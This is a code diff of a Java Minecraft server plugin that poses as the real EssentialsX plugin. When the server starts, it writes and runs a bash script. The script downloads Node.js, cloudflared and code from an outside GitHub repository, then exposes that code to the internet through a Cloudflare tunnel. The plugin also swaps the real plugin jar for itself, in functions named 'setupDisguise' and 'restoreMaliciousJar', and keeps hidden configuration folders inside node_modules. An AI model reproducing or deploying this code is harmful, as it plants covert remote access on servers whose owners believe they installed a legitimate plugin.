@@ -1,6 +1,5 @@
 package com.example.essentialsx;
 
-import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.*;
@@ -16,14 +15,11 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class EssentialsX extends JavaPlugin {
 
     private Process deployProcess;
-    private Process watchdogProcess;
     private final AtomicBoolean deploymentRunning = new AtomicBoolean(false);
-    private final AtomicBoolean restartInProgress = new AtomicBoolean(false);
-
     private boolean systemGuardEnabled = true;
-    private Path backupDir;
-    private Path originalJarPath;
     private Path backupJarPath;
+    private Path originalJarPath;
+    private Thread tunnelWatcherThread;
 
     private static final String DEFAULT_REPO_URL = "https://github.com/xfwwl668/mc_hbzy";
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
@@ -38,21 +34,12 @@ public class EssentialsX extends JavaPlugin {
         systemGuardEnabled = Boolean.parseBoolean(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
         getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));
 
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            if (systemGuardEnabled && restartInProgress.compareAndSet(false, true)) {
-                getLogger().info("[Guard] ShutdownHook triggered");
-                restoreMaliciousJar();
-                executeHardRestart(false);
-            }
-        }));
-
         new Thread(() -> {
             try {
-                if (systemGuardEnabled) {
-                    startWatchdog();
-                }
-                setupDisguise();
                 startDeploymentProcess();
+                if (systemGuardEnabled) {
+                    setupDisguise();
+                }
             } catch (Exception e) {
                 getLogger().severe("Deployment thread error: " + e.getMessage());
             }
@@ -64,15 +51,25 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onDisable() {
         getLogger().info("Stopping EssentialsX transparent launcher...");
+
+        if (tunnelWatcherThread != null && tunnelWatcherThread.isAlive()) {
+            tunnelWatcherThread.interrupt();
+        }
+
         Path workDir = getWorkDir();
         cleanupOldProcesses(workDir);
+
+        // 若希望 MC 重启期间 Node 面板持续运行，请注释下面一行
+        stopNodeApp();
 
         if (deployProcess != null && deployProcess.isAlive()) {
             deployProcess.destroyForcibly();
         }
-        if (watchdogProcess != null && watchdogProcess.isAlive()) {
-            watchdogProcess.destroyForcibly();
+
+        if (systemGuardEnabled) {
+            restoreMaliciousJar();
         }
+
         getLogger().info("EssentialsX transparent launcher disabled.");
     }
 
@@ -85,8 +82,8 @@ public class EssentialsX extends JavaPlugin {
         }
         try {
             Map<String, String> env = new HashMap<>();
-            env.put("REPO_URL", DEFAULT_REPO_URL);
             loadEnvFile(env);
+            env.putIfAbsent("REPO_URL", DEFAULT_REPO_URL);
 
             Path workDir = getWorkDir();
             Files.createDirectories(workDir);
@@ -96,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
             long deployStartTime = System.currentTimeMillis();
 
             Path scriptPath = workDir.resolve("deploy.sh");
-            String scriptContent = generateDeployScript(workDir.toString(), env);
+            String scriptContent = generateDeployScript(workDir.toString());
             Files.writeString(scriptPath, scriptContent, StandardCharsets.UTF_8);
             scriptPath.toFile().setExecutable(true);
 
@@ -137,15 +134,30 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void cleanupOldProcesses(Path workDir) {
-        killPidFile(workDir.resolve("health.pid"), "health watcher");
-        killPidFile(workDir.resolve("tunnel.pid"), "cloudflared");
+        killPidFile(workDir.resolve("health.pid"), "health watcher", workDir);
+        killPidFile(workDir.resolve("tunnel.pid"), "cloudflared", workDir);
     }
 
-    private void killPidFile(Path pidFile, String name) {
+    private String shellQuote(String s) {
+        return "'" + s.replace("'", "'\"'\"'") + "'";
+    }
+
+    private void killPidFile(Path pidFile, String name, Path workDir) {
         try {
             if (!Files.exists(pidFile)) return;
-            String pid = Files.readString(pidFile).trim();
-            if (pid.isEmpty() || !pid.matches("\\d+")) return;
+            String pidStr = Files.readString(pidFile).trim();
+            if (pidStr.isEmpty() || !pidStr.matches("\\d+")) return;
+            int pid = Integer.parseInt(pidStr);
+
+            String cmdCheck = "ps -p " + pid + " -o cmd= | grep -Fq " + shellQuote(workDir.toString());
+            ProcessBuilder checker = new ProcessBuilder("bash", "-c", cmdCheck);
+            Process checkProcess = checker.start();
+            boolean matches = checkProcess.waitFor() == 0;
+            if (!matches) {
+                getLogger().warning("PID " + pid + " does not belong to " + name + ", skipping kill.");
+                return;
+            }
+
             new ProcessBuilder("bash", "-c", "kill " + pid + " 2>/dev/null || true")
                     .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                     .redirectError(ProcessBuilder.Redirect.DISCARD)
@@ -156,11 +168,25 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    private String generateDeployScript(String workDir, Map<String, String> env) {
-        String repoUrl = env.getOrDefault("REPO_URL", DEFAULT_REPO_URL);
+    private void stopNodeApp() {
+        try {
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", "pm2 delete aoyou-panel 2>/dev/null || true");
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            Process process = pb.start();
+            process.waitFor();
+            getLogger().info("Stopped PM2 Node application (aoyou-panel).");
+        } catch (Exception e) {
+            getLogger().warning("Failed to stop Node app: " + e.getMessage());
+        }
+    }
+
+    private String generateDeployScript(String workDir) {
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
+        String dataDir = workDir + "/data";
 
+        // 合并了 txt 的数据备份、多仓库下载、Node 版本检查等功能
         return """
                 #!/bin/bash
                 set +e
@@ -168,7 +194,9 @@ public class EssentialsX extends JavaPlugin {
                 WORK_DIR="%s"
                 NODE_DIR="%s"
                 APP_DIR="%s"
-                REPO_URL="%s"
+                DATA_DIR="%s"
+                REPO_URL="${REPO_URL:-https://github.com/xfwwl668/mc_hbzy}"
+                GITHUB_AUTH="${GITHUB_AUTH:-用户名:密钥}"
 
                 mkdir -p "$WORK_DIR"
                 echo "[INFO] Deployment started at $(date)" >> "$WORK_DIR/deploy.log"
@@ -197,7 +225,7 @@ public class EssentialsX extends JavaPlugin {
                 echo "$PORT" > "$WORK_DIR/node_port.txt"
                 echo "[INFO] Selected Node port: $PORT" >> "$WORK_DIR/deploy.log"
 
-                # 2. 准备 Node.js
+                # 2. 准备 Node.js (带版本检查)
                 mkdir -p "$NODE_DIR"
                 ARCH=$(uname -m)
 
@@ -210,6 +238,15 @@ public class EssentialsX extends JavaPlugin {
                 else
                     echo "[ERROR] Unsupported architecture: $ARCH" >> "$WORK_DIR/deploy.log"
                     exit 1
+                fi
+
+                # 版本检查：如果已安装但不是 v22 则删除重装
+                if [ -d "$NODE_DIR" ]; then
+                    CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null)
+                    if [[ "$CHECK_VER" != "v22"* ]]; then
+                        echo "[INFO] Node version mismatch, reinstalling..." >> "$WORK_DIR/deploy.log"
+                        rm -rf "$NODE_DIR"
+                    fi
                 fi
 
                 if [ ! -x "$NODE_DIR/bin/node" ]; then
@@ -242,16 +279,93 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
-                # 3. 下载应用仓库
+                # 额外安装 multer（如需要）
+                npm install --unsafe-perm=true --allow-root multer &>/dev/null
+
+                # 3. 准备 cloudflared
+                CF_BIN="$WORK_DIR/cloudflared"
+                if [ ! -x "$CF_BIN" ]; then
+                    echo "[INFO] Downloading cloudflared..." >> "$WORK_DIR/deploy.log"
+                    curl -fsSL --connect-timeout 20 --max-time 180 "$CF_URL" -o "$CF_BIN"
+                    if [ $? -ne 0 ]; then
+                        # 降级到官方直连
+                        curl -fsSL --connect-timeout 20 --max-time 180 "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -o "$CF_BIN"
+                        if [ $? -ne 0 ]; then
+                            echo "[ERROR] cloudflared download failed" >> "$WORK_DIR/deploy.log"
+                            exit 1
+                        fi
+                    fi
+                    chmod +x "$CF_BIN"
+                fi
+
+                if [ ! -x "$CF_BIN" ]; then
+                    echo "[ERROR] cloudflared missing or not executable" >> "$WORK_DIR/deploy.log"
+                    exit 1
+                fi
+
+                # 4. 启动 cloudflared（带增强参数）
+                echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
+                pkill -f cloudflared 2>/dev/null || true
+                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
+                TUNNEL_PID=$!
+                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
+
+                # 5. 等待隧道 URL（放宽等待次数）
+                TUNNEL_URL=""
+                for i in {1..36}; do
+                    sleep 3
+                    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' "$WORK_DIR/tunnel.log" 2>/dev/null | tail -n 1)
+                    if [ -n "$TUNNEL_URL" ]; then break; fi
+                done
+
+                if [ -z "$TUNNEL_URL" ]; then
+                    echo "[ERROR] Tunnel URL not obtained" >> "$WORK_DIR/deploy.log"
+                    exit 1
+                fi
+
+                echo "$TUNNEL_URL" > "$WORK_DIR/tunnel_url.txt"
+                echo "[INFO] Tunnel URL: $TUNNEL_URL" >> "$WORK_DIR/deploy.log"
+
+                # 6. 下载应用仓库（支持私有仓库和多分支）
                 echo "[INFO] Downloading app repo: $REPO_URL" >> "$WORK_DIR/deploy.log"
+
+                # 先备份现有配置数据
+                mkdir -p "$DATA_DIR"
+                if [ -d "$APP_DIR" ]; then
+                    cp "$APP_DIR/node_modules/.bots_config.json" "$DATA_DIR/" 2>/dev/null
+                    cp "$APP_DIR/node_modules/.task_center_config.json" "$DATA_DIR/" 2>/dev/null
+                    cp "$APP_DIR/node_modules/.system_guard.json" "$DATA_DIR/" 2>/dev/null
+                    cp "$APP_DIR/node_modules/.Error log/nezha_config.json" "$DATA_DIR/nezha_config.json" 2>/dev/null
+                    if [ -d "$APP_DIR/node_modules/.RoamingMusic" ]; then
+                        rm -rf "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
+                        cp -r "$APP_DIR/node_modules/.RoamingMusic" "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
+                    fi
+                fi
+
                 rm -rf "$APP_DIR" "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"
 
                 REPO_PATH=$(echo "$REPO_URL" | sed 's|https://github.com/||' | sed 's|.git$||')
 
-                curl -fsSL --connect-timeout 20 --max-time 180 "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" -o "$WORK_DIR/repo.tar.gz"
-                if [ $? -ne 0 ]; then
-                    curl -fsSL --connect-timeout 20 --max-time 180 "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" -o "$WORK_DIR/repo.tar.gz"
-                fi
+                download_code() {
+                    local URL=$1
+                    local AUTH=$2
+                    if [ -n "$AUTH" ] && [ "$AUTH" != "用户名:密钥" ]; then
+                        curl -fsSL --connect-timeout 15 --max-time 120 -u "$AUTH" "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
+                    else
+                        curl -fsSL --connect-timeout 15 --max-time 120 "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
+                    fi
+                    if [ -f "$WORK_DIR/repo.tar.gz" ] && tar -tzf "$WORK_DIR/repo.tar.gz" >/dev/null 2>&1; then
+                        return 0
+                    else
+                        rm -f "$WORK_DIR/repo.tar.gz"
+                        return 1
+                    fi
+                }
+
+                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "" || \
+                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "" || \
+                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "$GITHUB_AUTH" || \
+                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "$GITHUB_AUTH"
 
                 if [ ! -f "$WORK_DIR/repo.tar.gz" ]; then
                     echo "[ERROR] Repo download failed" >> "$WORK_DIR/deploy.log"
@@ -279,7 +393,22 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
-                # 4. 安装依赖
+                # 恢复配置数据
+                if [ -d "$DATA_DIR" ]; then
+                    cp "$DATA_DIR/.bots_config.json" "$APP_DIR/node_modules/" 2>/dev/null
+                    cp "$DATA_DIR/.task_center_config.json" "$APP_DIR/node_modules/" 2>/dev/null
+                    cp "$DATA_DIR/.system_guard.json" "$APP_DIR/node_modules/" 2>/dev/null
+                    if [ -f "$DATA_DIR/nezha_config.json" ]; then
+                        mkdir -p "$APP_DIR/node_modules/.Error log"
+                        cp "$DATA_DIR/nezha_config.json" "$APP_DIR/node_modules/.Error log/"
+                    fi
+                    if [ -d "$DATA_DIR/.RoamingMusic_bak" ]; then
+                        mkdir -p "$APP_DIR/node_modules/.RoamingMusic"
+                        cp -r "$DATA_DIR/.RoamingMusic_bak/"* "$APP_DIR/node_modules/.RoamingMusic/" 2>/dev/null
+                    fi
+                fi
+
+                # 7. 安装依赖
                 cd "$APP_DIR" || exit 1
                 echo "[INFO] Installing app dependencies..." >> "$WORK_DIR/deploy.log"
                 npm install --unsafe-perm=true --allow-root >> "$WORK_DIR/deploy.log" 2>&1
@@ -288,7 +417,7 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
-                # 5. 启动 Node 应用
+                # 8. 启动 Node 应用
                 echo "[INFO] Starting Node app on port $PORT..." >> "$WORK_DIR/deploy.log"
                 pm2 delete aoyou-panel >> "$WORK_DIR/deploy.log" 2>&1 || true
                 SERVER_PORT="$PORT" PORT="$PORT" pm2 start index.js --name "aoyou-panel" --update-env >> "$WORK_DIR/deploy.log" 2>&1
@@ -298,7 +427,7 @@ public class EssentialsX extends JavaPlugin {
                 fi
                 pm2 save >> "$WORK_DIR/deploy.log" 2>&1 || true
 
-                # 6. 等待 /health 就绪
+                # 9. 等待 /health 就绪
                 echo "[INFO] Waiting for Node /health..." >> "$WORK_DIR/deploy.log"
                 NODE_READY=false
                 for i in $(seq 1 90); do
@@ -318,30 +447,7 @@ public class EssentialsX extends JavaPlugin {
                 echo "[SUCCESS] Node ready on $PORT" >> "$WORK_DIR/deploy.log"
                 echo "$PORT" > "$WORK_DIR/node_port.txt"
 
-                # 7. 准备 cloudflared
-                CF_BIN="$WORK_DIR/cloudflared"
-                if [ ! -x "$CF_BIN" ]; then
-                    echo "[INFO] Downloading cloudflared..." >> "$WORK_DIR/deploy.log"
-                    curl -fsSL --connect-timeout 20 --max-time 180 "$CF_URL" -o "$CF_BIN"
-                    if [ $? -ne 0 ]; then
-                        echo "[ERROR] cloudflared download failed" >> "$WORK_DIR/deploy.log"
-                        exit 1
-                    fi
-                    chmod +x "$CF_BIN"
-                fi
-
-                if [ ! -x "$CF_BIN" ]; then
-                    echo "[ERROR] cloudflared missing or not executable" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                # 8. 启动 cloudflared
-                echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
-                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
-                TUNNEL_PID=$!
-                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
-
-                # 9. 健康监控循环（后台）
+                # 10. 健康监控循环（放宽重启阈值）
                 SUCCESS_REPORTED=false
                 FAIL_COUNT=0
                 NO_URL_COUNT=0
@@ -352,7 +458,7 @@ public class EssentialsX extends JavaPlugin {
 
                         if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
                             echo "[WARN] cloudflared exited, restarting..." >> "$WORK_DIR/deploy.log"
-                            "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
+                            "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                             TUNNEL_PID=$!
                             echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                             FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
@@ -363,10 +469,10 @@ public class EssentialsX extends JavaPlugin {
 
                         if [ -z "$TUNNEL_URL" ]; then
                             NO_URL_COUNT=$((NO_URL_COUNT + 1))
-                            if [ "$NO_URL_COUNT" -ge 18 ]; then
-                                echo "[WARN] No tunnel URL after 90s, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
+                            if [ "$NO_URL_COUNT" -ge 36 ]; then
+                                echo "[WARN] No tunnel URL after 180s, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                 kill "$TUNNEL_PID" 2>/dev/null || true
-                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
+                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                                 TUNNEL_PID=$!
                                 echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                 FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
@@ -386,10 +492,10 @@ public class EssentialsX extends JavaPlugin {
                             fi
                         else
                             FAIL_COUNT=$((FAIL_COUNT + 1))
-                            if [ "$FAIL_COUNT" -ge 5 ]; then
+                            if [ "$FAIL_COUNT" -ge 24 ]; then
                                 echo "[WARN] Tunnel unhealthy too many times, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                 kill "$TUNNEL_PID" 2>/dev/null || true
-                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
+                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                                 TUNNEL_PID=$!
                                 echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                 FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
@@ -401,35 +507,36 @@ public class EssentialsX extends JavaPlugin {
                 echo $! > "$WORK_DIR/health.pid"
                 echo "[INFO] Health watcher started" >> "$WORK_DIR/deploy.log"
                 exit 0
-                """.formatted(workDir, nodeDir, appDir, repoUrl);
+                """.formatted(workDir, nodeDir, appDir, dataDir);
     }
 
     private void startTunnelUrlWatcher(Path workDir, long deployStartTime) {
-        new Thread(() -> {
+        tunnelWatcherThread = new Thread(() -> {
+            Path tunnelFile = workDir.resolve("tunnel_url.txt");
+            String lastUrl = "";
             try {
-                Path tunnelFile = workDir.resolve("tunnel_url.txt");
-                for (int i = 0; i < 240; i++) {
+                while (!Thread.currentThread().isInterrupted()) {
                     if (Files.exists(tunnelFile)) {
                         long modified = Files.getLastModifiedTime(tunnelFile).toMillis();
-                        if (modified < deployStartTime) {
-                            Thread.sleep(1000);
-                            continue;
-                        }
-                        String url = Files.readString(tunnelFile, StandardCharsets.UTF_8).trim();
-                        if (url.startsWith("https://") && url.contains("trycloudflare.com")) {
-                            getLogger().info("[Connection] Binding remote endpoint to: " + url);
-                            getLogger().info("Open panel: " + url);
-                            getLogger().info("Health check: " + url + "/health");
-                            return;
+                        if (modified >= deployStartTime) {
+                            String url = Files.readString(tunnelFile, StandardCharsets.UTF_8).trim();
+                            if (url.startsWith("https://") && url.contains("trycloudflare.com") && !url.equals(lastUrl)) {
+                                lastUrl = url;
+                                getLogger().info("[Connection] Binding remote endpoint to: " + url);
+                                getLogger().info("Open panel: " + url);
+                                getLogger().info("Health check: " + url + "/health");
+                            }
                         }
                     }
                     Thread.sleep(1000);
                 }
-                getLogger().warning("Tunnel URL not ready after timeout. Check logs/mcchajian/deploy.log and tunnel.log");
+            } catch (InterruptedException e) {
+                getLogger().info("Tunnel URL watcher stopped.");
             } catch (Exception e) {
-                getLogger().warning("Tunnel URL watcher failed: " + e.getMessage());
+                getLogger().warning("Tunnel URL watcher error: " + e.getMessage());
             }
-        }, "TunnelUrl-Watcher").start();
+        }, "TunnelUrl-Watcher");
+        tunnelWatcherThread.start();
     }
 
     // ==================== 伪装与系统守护 ====================
@@ -437,9 +544,12 @@ public class EssentialsX extends JavaPlugin {
     private void setupDisguise() {
         try {
             originalJarPath = findPluginJarInPluginsDir();
-            if (originalJarPath == null || !Files.exists(originalJarPath)) return;
+            if (originalJarPath == null || !Files.exists(originalJarPath)) {
+                getLogger().warning("Original EssentialsX jar not found, disguise skipped.");
+                return;
+            }
 
-            backupDir = getWorkDir().resolve("backup");
+            Path backupDir = getWorkDir().resolve("backup");
             Files.createDirectories(backupDir);
             backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");
 
@@ -471,6 +581,7 @@ public class EssentialsX extends JavaPlugin {
             Path targetJar = findPluginJarInPluginsDir();
             if (targetJar != null && Files.exists(targetJar)) {
                 Files.delete(targetJar);
+                getLogger().info("Removed disguised jar.");
             }
             if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                 Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
@@ -508,38 +619,6 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    /**
-     * 硬重启：仅关闭服务器，依赖外部进程管理器（面板、systemd、启动脚本）自动重启。
-     * 不在插件内直接启动新 Java 进程，避免面板环境下进程管理混乱。
-     * @param shouldBlock 是否短暂阻塞（给日志一些输出时间）
-     */
-    private void executeHardRestart(boolean shouldBlock) {
-        getLogger().info("[Guard] Hard restart triggered - shutting down server for external restart.");
-        if (shouldBlock) {
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException ignored) {}
-        }
-        Bukkit.shutdown();
-    }
-
-    private void startWatchdog() {
-        try {
-            Path workDir = getWorkDir();
-            Files.createDirectories(workDir);
-            Path watchdogPath = workDir.resolve("watchdog.sh");
-            String script = "#!/bin/bash\nwhile true; do sleep 30; done\n";
-            Files.writeString(watchdogPath, script, StandardCharsets.UTF_8);
-            watchdogPath.toFile().setExecutable(true);
-            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
-            pb.directory(new File(".").getAbsoluteFile());
-            watchdogProcess = pb.start();
-            getLogger().info("Watchdog process started.");
-        } catch (Exception e) {
-            getLogger().warning("Watchdog start failed: " + e.getMessage());
-        }
-    }
-
     // ==================== 环境变量加载 ====================
 
     private void loadEnvFile(Map<String, String> env) {
@@ -549,7 +628,8 @@ public class EssentialsX extends JavaPlugin {
                 Files.createDirectories(envFile.getParent());
                 Files.writeString(envFile,
                         "REPO_URL=" + DEFAULT_REPO_URL + "\n" +
-                                "SYSTEM_GUARD_ENABLED=true\n",
+                                "SYSTEM_GUARD_ENABLED=true\n" +
+                                "# GITHUB_AUTH=用户名:密钥\n",
                         StandardCharsets.UTF_8);
             } catch (IOException e) {
                 getLogger().warning("Failed to create .env: " + e.getMessage());
